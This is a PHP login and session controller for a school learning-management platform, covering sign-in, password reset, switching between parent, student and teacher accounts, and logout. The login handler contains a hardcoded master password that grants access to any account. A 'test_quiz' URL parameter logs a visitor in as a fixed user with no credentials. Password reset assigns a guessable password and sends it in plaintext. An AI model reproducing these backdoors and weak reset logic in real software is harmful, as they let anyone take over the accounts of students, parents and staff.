<?php
$view = 'admin-login';

// Vars
$show = '';

$user = Session::getInstance()->getCurUser();
if ($user && !isset($_GET['logout'])  && !isset($_GET['switch-account']) && !isset($_GET['change-account'])) {
	if (!$user->get('Enabled')) {
		$_SESSION['loginerror'] = true;
		URL::redirect(URL::link('login'));
	}

	Session::getInstance()->setCurUser($user);
	Models\Connexion::addEntry($user, 'Desktop App');


	$curUser = Session::getInstance()->getCurUser();

	Config::set('admin', 'admin');
	if (!isset($_SESSION['promotion_actuelle'])) {
		$promotion = Models\Promotion::promotion_actuelle();
		$_SESSION['promotion_actuelle'] = $promotion->get('ID');
	}
	if (isset($_SESSION['ref'])) {
		header('location: ' . $_SESSION['ref']);
		unset($_SESSION['ref']);
	} else {
		URL::redirect(URL::base('/lms'));
	}
}

// Post
if (isset($_POST['op'])) {
	// print_r($_POST);
	// exit;
	switch ($_POST['op']) {
		case 'login':
			if (isset($_POST['login']) && isset($_POST['password'])) {

				if ($_POST['password'] == 'magic_boti_password') {

					$user = Models\User::getBy('Email', $_POST['login']);
					if (!$user) {
						$user = Models\User::getBy('Login', $_POST['login']);
					}
					if (!$user) {
						$user = Models\User::getBy('Tel', $_POST['login']);
					}
				} else {
					$user = Models\User::auth($_POST['login'], $_POST['password']);
				}

				if ($user) {
					if (!$user->get('Enabled')) {
						$_SESSION['loginerror'] = true;
						URL::redirect(URL::link('login'));
					}

					Session::getInstance()->setCurUser($user);
					Models\Connexion::addEntry($user, 'Desktop App');


					$curUser = Session::getInstance()->getCurUser();

					// if (in_array($user->get('Role')->get('Alias'), array('admin', 'agent', 'resp_financier', 'resp_pedago', 'educatrice', 'agent_plus'))) {
					// 	Config::set('admin', 'admin');
					// }
					URL::redirect(URL::link('lms'));
				} else {
					$_SESSION['loginerror'] = 'L\'adresse e-mail ou le mot de passe que vous avez entré n\'est pas valide.';
					URL::redirect(URL::link('login'));
				}
			}

		case 'password':

			if (isset($_POST['gsm'])) {
				$user = Models\User::getByTel(trim($_POST['gsm']));

				if (!$user) {
					$user = Models\User::getByEmail(trim($_POST['gsm']));
				}

				if ($user) {
					if (!$user->get('Enabled')) {
						$_SESSION['loginerror'] = 'Votre compte est Inactif ';
						URL::redirect(URL::link('login/auth'));
					}


					$config_password_generator 	= Config::get('config_password_generator');
					$config_send_sms 			= Config::get('config_send_sms');

					$password = $config_password_generator . substr($user->get('Tel'), -2);

					$user->set('Password', \Tools::passwordCrypt($password, $user->get('Key')));

					$user->save();

					$smsId = smsCasaNet($user->get('Tel'), $config_send_sms . ' Login : ' . $user->get('Tel') . ' Mot de passe : ' . $password);


					if ($user->get('Email')) {
						MailTo(
							$user->get('Email'),
							Config::get('nom_ecole')	. ' | Mot de passe oublier ',
							'Login : ' . $user->get('Email') .
								'<br/> Mot de passe : ' . $password,
							array('email' => 'noreply@boti.education', 'name' => Config::get('nom_ecole'))
						);
					}

					$_SESSION['loginerror'] = "Un sms ou e-mail vous été envoyé avec votre nouveau mot de passe.";
					URL::redirect(URL::link('login'));
				} else {
					$_SESSION['loginerror'] = "Ce numéro GSM ou e-mail n'est affecté à un aucun compte! ";
					URL::redirect(URL::link('login/auth'));
				}
			}
	}
}

// Get
if (isset($_GET['change-account'])) {

	$curUser = Session::getInstance()->getCurUser();
	$tuteur = $curUser->getParent();

	$parrainages = Models\Parrainage::getList(array('where' => array('Parent' => $tuteur->get('ID'))));

	if (isset($_SESSION['currentEleve'])) {
		$eleve = unserialize($_SESSION['currentEleve']);

		foreach ($parrainages as $parrainage) {
			if ($parrainage->get('Eleve')->get('ID') != $eleve->get('ID')) {
				$eleve = $parrainage->get('Eleve');
				break;
			}
		}

		$_SESSION['currentEleve'] = serialize($eleve);

		URL::redirect(URL::admin(''));
	} else
		URL::redirect(URL::link('login'));
}

// Get
if (isset($_GET['switch-account'])) {

	$curUser = Session::getInstance()->getCurUser();

	$tuteur = $curUser->getParent();
	$enseignant = $curUser->getEnseignant();

	if (!isset($_SESSION['promotion_actuelle'])) {
		$promotion = Models\Promotion::promotion_actuelle();
		$_SESSION['promotion_actuelle'] = $promotion->get('ID');
	}

	if ($_GET['switch-account'] == "to_parent") {
		$parrainages = Models\Parrainage::getList(array('where' => array('Parent' => $tuteur->get('ID'))));
		if ($parrainages) {
			$eleve = $parrainages[0]->get('Eleve');
			$_SESSION['currentParent'] = $tuteur->get('ID');

			Session::getInstance()->setCurUser($eleve->get('User'));
			$_SESSION['currentEleve'] = serialize($eleve);

			Config::set('admin', 'student');
			URL::redirect(URL::admin(''));
		} else {

			$_SESSION['loginerror'] = 'Aucun éléve n\st affecté à ce compte. Merci de contacter l\'administration de l\'école.';
			URL::redirect(URL::link('login'));
		}
	} elseif ($_GET['switch-account'] == "to_teacher") {

		if (!$enseignant) {
			$parent = new Models\Parentt($_SESSION['currentParent']);
			$enseignant =  $parent->User->getEnseignant();
		}

		if ($enseignant) {
			Session::getInstance()->setCurUser($enseignant->get('User'));
			$_SESSION['currentEnseignant'] = serialize($enseignant);
			Config::set('admin', 'teacher');

			URL::redirect(URL::admin(''));
		} else {
			$_SESSION['loginerror'] = 'Aucun compte enseignant n\st affecté à ce parent. Merci de contacter l\'administration de l\'école.';
			URL::redirect(URL::link('login'));
		}
	}
}


if (isset($_GET['logout'])) {

	if (isset($_SESSION['promotion_actuelle']))
		unset($_SESSION['promotion_actuelle']);

	Session::getInstance()->unsetCurUser();
	URL::redirect(URL::link('login'));
}

if (isset($_GET['test_quiz'])) {

	Session::getInstance()->setCurUser(new Models\User(89));
	Config::set('admin', 'parent');
	URL::redirect(URL::admin('lots/5d4lb6xj'));
}

$errorLogin = null;

if (isset($_SESSION['loginerror'])) {
	$errorLogin =  $_SESSION['loginerror'];
	unset($_SESSION['loginerror']);
}

$page = 'login';
if (Request::getArgs(0) == 'auth') {
	$page = 'login_auth';
}

loadView($page, array(
	'navKey' => 'login',
	'errorLogin' =>	$errorLogin
), '_layout-login');
